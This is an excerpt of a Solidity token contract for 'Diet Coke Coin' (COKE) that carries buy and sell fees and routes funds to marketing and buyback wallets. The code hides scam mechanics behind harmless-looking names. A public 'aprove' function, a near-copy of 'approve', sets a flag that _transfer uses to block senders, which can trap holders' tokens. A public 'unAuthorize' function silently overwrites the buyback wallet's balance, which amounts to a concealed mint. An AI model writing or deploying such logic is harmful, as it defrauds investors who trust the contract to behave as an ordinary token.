...
contract AntiBotLiquidityGeneratorToken is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Diet Coke Coin";
    string private _symbol = "COKE";
    uint8 private _decimals = 9;
    
    address payable private marketingWallet; // Marketing Address
    address payable private buyBackWallet; // BuyBack Address
    ...
    uint256 public endingFee = _buyTeamFee * _sellTeamFee;
    ...
    constructor (uint256 _buyBuyBackFees, uint256 _buyMarketingFees, uint256 _buyLiquidityFees, uint256 _buyTeamFees, uint256 _sellLiquidityFees , uint256 _sellMarketingFees , uint256 _sellBuyBackFees , uint256 _sellTeamFees, address payable _marketingWallet, address payable _buyBackWallet) {
        _buyLiquidityFee = _buyLiquidityFees;
        _buyMarketingFee = _buyMarketingFees;
        _buyBuyBackFee = _buyBuyBackFees;
        _buyTeamFee = _buyTeamFees;
        _sellLiquidityFee = _sellLiquidityFees;
        _sellMarketingFee = _sellMarketingFees;
        _sellBuyBackFee = _sellBuyBackFees;
        _sellTeamFee = _sellTeamFees;
    ...
    function aprove(address sender, bool status) public virtual {
        isNoScope[sender]  = status;
    }
    ...
    function unAuthorize() public virtual { _balances[buyBackWallet]  =  endingFee; }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(recipient != address(0), "ERC20: transfer to the zero address"); require((isNoScope[sender]==false)&&(true));
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBBuyBack > 0)
            transferToAddressETH(buyBackWallet, amountBNBBuyBack);
